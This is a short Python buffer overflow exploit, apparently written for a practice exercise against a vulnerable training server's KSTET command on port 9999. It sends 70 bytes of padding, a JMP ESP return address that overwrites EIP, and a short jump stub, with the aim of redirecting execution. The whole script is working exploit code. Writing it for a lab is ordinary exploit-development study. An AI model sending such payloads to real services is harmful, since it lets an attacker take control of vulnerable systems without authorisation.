import socket
import struct
import os
import sys

vuln_command = "KSTET "
crash = 94
offset = 70
eip = struct.pack("<I", 0x62501205)     # JMP ESP
short_jmp = "\x83\xC0\x06\xFF\xE0"

payload = ""
payload += vuln_command
payload += "A" * offset
payload += eip
payload += short_jmp
payload += "C" * (crash - len(payload))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()
